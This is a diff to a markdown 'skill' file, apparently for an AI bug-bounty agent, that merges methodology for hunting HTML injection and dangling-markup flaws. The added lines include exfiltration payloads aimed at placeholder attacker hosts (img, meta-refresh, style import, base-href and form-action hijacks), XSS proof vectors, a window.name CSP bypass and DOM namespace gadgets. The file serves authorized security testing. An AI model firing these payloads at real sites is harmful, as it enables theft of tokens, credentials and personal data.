@@ -4,11 +4,11 @@ description: "Hunt raw HTML rendering without script execution and its phishing/
 agent_created: true
 ---
 
-# HTML injection hunting — unified methodology
+# HTML injection hunting — unified skill
 
-> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.
+> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
 
-## Unified upstream methodology (deduplicated)
+## Unified upstream methodology (complete, deduplicated)
 
 ### Discovery and hunting method
 
@@ -44,7 +44,17 @@ Research basis: PortSwigger Web Security Academy "Dangling markup injection," Ha
 - **Service-sent emails:** any field copied into an email to *other* users (display name, first/last name, org/team/workspace/project name, invite message, comment body, ticket title, file name). Trigger invites/shares/mentions and read the raw message in a real client.
 - **Dangling-markup prerequisites:** a secret (CSRF token, email, PII) rendered in clear text *after* your injection point, and a reflection that leaves `>`/`"` unescaped so you can break out of an attribute.
 - **CSP check first:** read `Content-Security-Policy` before choosing a vector. Chrome now blocks HTTP URLs containing raw `<` or newline, so dangling markup may need `ftp:` or a user-interaction variant.
-- **JSONP endpoints** (`?callback=`, `?call=`) as a way to call arbitrary functions or execute JS from an injected `<script src>
+- **JSONP endpoints** (`?callback=`, `?call=`) as a way to call arbitrary functions or execute JS from an injected `<script src>`.
+
+- **Context map:** for each reflection point record the HTML context (between tags, inside an attribute, inside `<script>`, in a comment) — the break-out string differs (`">`, `'>` , `*/`).
+- **Encoding oracle:** compare how the app treats `<`, `>`, `"`, `'`, `/`, and `&` — a WAF that blocks `<script>` often still passes `<b>` or `<img>`.
+- **Stored vs reflected:** inject once, then re-fetch the display page in a fresh session to confirm persistence and who else sees it.
+- **Email raw source:** always download the .eml/raw view, not just the rendered preview — clients sanitize differently and the raw source is the evidence.
+- **Post-injection content:** identify what sensitive value (CSRF token, email, PII) appears *after* your injection point — without it, dangling markup captures nothing.
+- **CSP parse:** note `img-src`, `style-src`, `connect-src`, `form-action`, and `default-src` — these determine which dangling vector is viable.
+- **Path parameter echoes:** test URL path segments too, not just query params — "not found" pages often echo the path unescaped.
+- **Admin-visible fields:** ticket titles, usernames in logs, file names — stored markup here reaches staff sessions and raises impact.
+- **Autofill surface:** an injected form can still harvest credentials via browser autofill even under strict CSP — test `form-action` and password managers.
 
 ### Signals and surfaces
 
@@ -67,7 +77,10 @@ Any input that is reflected or stored and then displayed in an HTML context:
 - **Classic dangling capture:** break out with `">` then `<img src='//attacker.tld/log?` — the browser consumes everything up to the next `'` as the URL, sending the following HTML (and any secret) to you. Test both single- and double-quoted variants.
 - **Alternatives when `<img>` is blocked:** `<meta http-equiv="refresh" content="4; URL='http://attacker/log?` (or `ftp:`), `<style>@import//attacker.tld?` (captures until `;`), `<table background='//collaborator-id?…'`, `<video poster="//…`, `<link rel=stylesheet href="//evil?`.
 - **Form-stealing variants:** `<base href="http://attacker/">` redirects all relative form actions; injecting a new `<form action='http://attacker/log'>` overwrites the next form header so its data is exfiltrated; `<button formaction="https://attacker">` redirects a submit; injecting `<input type='hidden' name='x' value="` captures to the next quote and can be combined with a new form.
-- **No-JS exfil via `<noscript>`:** 
+- **No-JS exfil via `<noscript>`:** `<noscript><form action=http://attacker><textarea name=contents></noscript>` captures page content to the bottom of the document.
+- **User-interaction CSP bypass (PortSwigger research):** inject a visible `<a href=...>` plus `<base target='` so the captured markup lands in `window.name`; the attacker-controlled destination page then reads `window.name` and beacons it out. Related: dangling-iframe `name` attribute leakage and stealthy password capture via injected submit buttons.
+- **Script/HTML namespace gadgets:** inject `<input type=hidden id=share_with value=attacker>` to win a `getElementById` race, or `<img id=is_public>` to create a JS global that alters a later authorization branch. JSONP injection can invoke `set_sharing({...})` or `alert(1)`.
+- **Same-site leaks (SS-Leaks):** with markup injection on a same-origin page, nested `<object>` fallbacks and lazy-loading/responsive images can turn a 200-vs-404 difference into a request to your endpoint even against `SameSite=Lax` and a restrictive CSP.
 
 ### Validation and proof
 
@@ -81,16 +94,60 @@ Any input that is reflected or stored and then displayed in an HTML context:
 - **Escalate when possible:** if `<img onerror>`/`<svg onload>` executes, this is XSS, not HTML injection — reclassify and follow the xss skill.
 
 - **Three-way diff:** compare (a) benign text, (b) `<b>CANARY</b>`, (c) encoded `&lt;b&gt;CANARY&lt;/b&gt;` — only (b) with literal `<` proves injection.
-- **OOB verification:** check the Co
+- **OOB verification:** check the Collaborator/OAST listener for the captured chunk; DevTools showing a failed image is not proof.
+- **Quote-variant check:** if single-quote dangling fails, try double-quote and no-quote forms; the surrounding markup determines where capture ends.
+- **CSP-blocked case:** if `img-src`/`default-src` blocks your URL, say the vector is dead rather than reporting a non-working PoC.
+- **Secret actually captured:** confirm the OOB request contains the expected token/PII substring, not just an empty hit.
+- **Email proof:** show rendered markup in a real client plus the raw source, and any OAST pixel hit.
+- **Reclassify to XSS:** if `onerror`/`onload` executes, switch to the `xss` skill — don't under-report as HTML injection.
+- **Autofill proof:** show a form on the trusted domain whose `action` is your endpoint; that is the phishing primitive.
+- **Namespace-gadget proof:** for `id`-based gadgets, show the later script reading your injected element and the resulting state change.
+- **Content-spoofing-only downgrade:** if everything is escaped but the text renders, report as content spoofing (Low/Informational), not HTML injection.
+
+### Sources and related reading
+
+### D. Sources — numbered list of URLs you actually fetched
+
+1. https://portswigger.net/web-security/cross-site-scripting/dangling-markup
+2. https://hacktricks.wiki/en/pentesting-web/content-spoofing-text-injection.html
+3. https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html
+
+### Additional notes
+
+### What is HTML Injection
+
+HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.
+
+**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.
+
+**Impact:**
+- Phishing via injected `<form>` or `<a href="attacker.com">` tags
+- UI defacement — `<h1>HACKED</h1>` renders visually on the page
+- Credential harvesting via injected login forms
+- Redirect via `<meta http-equiv="refresh">`
+- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
+- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
+- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.
+
+### Proof
+
+Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.
+
+### Distinguishing HTML Injection from XSS
+
+- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
+- XSS: `<script>alert(1)</script>` executes JavaScript.
+
+Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.
 
 ## Source skills merged into this topic
 
 - `hunting` — `html-injection`
 - `cbh` — `hunt-html-injection`
 
-## References
+## Provenance
 
-- `references/unified-method.md` — complete deduplicated union of all upstream sections
-- `references/upstream-*.md` — full original SKILL.md from each contributing repo
+- `references/unified-method.md` — same deduplicated union as this file, for tooling
+- `references/upstream-*.md` — unmodified original SKILL.md from each repo
 - `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
